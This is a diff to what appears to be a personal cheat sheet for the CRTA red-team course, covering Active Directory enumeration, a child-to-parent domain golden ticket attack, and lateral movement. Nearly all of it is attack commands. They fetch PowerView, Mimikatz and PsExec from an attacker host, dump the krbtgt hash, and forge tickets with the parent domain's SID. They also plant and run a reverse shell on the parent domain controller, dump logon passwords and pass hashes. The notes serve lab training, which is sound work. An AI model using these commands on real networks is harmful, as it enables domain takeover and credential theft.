@@ -1,5 +1,9 @@
 # CRTA
 
+{% hint style="danger" %}
+USE THE TOOLS  PROVIDED BY THE COURSE
+{% endhint %}
+
 ## Initial Access
 
 ### Discover the hosts
@@ -288,6 +292,8 @@ Now we have a stable shell
 
 
 
+## AD Enumeration
+
 ### Get domain user information
 
 ```powershell
@@ -297,3 +303,108 @@ net user /dom
 # user info
 net user $USER /dom
 ```
+
+
+
+### PowerView
+
+```powershell
+iwr http://$ATT_IP:PORT/PowerView.ps1 -OutFile C:\Users\...\pv.ps1
+
+powershell -ep bypass
+import-module .\pv.ps1
+```
+
+<pre class="language-powershell"><code class="lang-powershell"><strong># get the ad trust information
+</strong><strong>Get-ADTrust -Filter * 
+</strong>Get-DomainTrust -Filter *
+
+# get forest information
+Get-ADForest
+</code></pre>
+
+## Generate a Ticket to move between DCs
+
+Requirements:
+
+* Admin privilege on Child DC
+* get krbtgt hash
+
+```bash
+proxychains impacket-secretdump 'DOMAIN/$USER@$DC_IP' -hashes :$LM
+```
+
+* SID of both child and parent machine
+
+```powershell
+# with PowerView
+Get-DomainSID -Domain child.DOMAIN.com
+Get-DomainSID -Domain DOMAIN.com
+```
+
+### Craft golden ticket
+
+{% code overflow="wrap" %}
+```powershell
+.\mimi.exe
+
+kerberos::golden /user:Administrator /domain:$CURRENT_DOMAIN /sid:$SID /sids:$PARENT_DOMAIN_SID-519 /aes256:$KRBTGT_AES256 /startoffset:-5 /endin:600 /renew:10080 /ptt
+```
+{% endcode %}
+
+Check the tickets in the session
+
+```
+klist
+```
+
+And now use it to access to Parent Domain Controller
+
+Transfer the PsExec.exe to the ticketed session.&#x20;
+
+```powershell
+iwr http://$ATT_IP:PORT/PsExec.exe -OutFile C:\Users\..\ps.exe
+```
+
+We probably already are in PsExec session and we cannot make 2 session in 1. But to obatin a shell to Parent DC we can copy another RevShell to Parent DC.
+
+```powershell
+copy rev2.exe \\$PARENT_DC_NAME\c$
+```
+
+And now with PsExec we will execute the Rev2 to make a connection with Parent DC
+
+```powershell
+ps.exe -accepteula -d \\$PARENT_DC_NAME cmd /c "C:\Rev2.exe" 
+```
+
+## Lateral Movement
+
+### Mimikatz
+
+Get information using mimikatz (High privilege required)
+
+```powershell
+iwr http://$ATT_IP :PORT/mimikatz.exe -OutFile C:\Users\...\mimi.exe
+```
+
+```powershell
+.\mimi.exe 
+
+> sekurlsa::logonpasswords
+```
+
+If we found some NTLM we can perform pass-the-hash attack
+
+```bash
+proxychains crackmapexec smb $IP -u $USER -H $LM 
+```
+
+When we found a machine Pwnd we can perform lateral movement with PsExec
+
+```bash
+proxuchains impacket-psexec 'DOMAIN/$USER@$IP' -hashes :$LM
+```
+
+
+
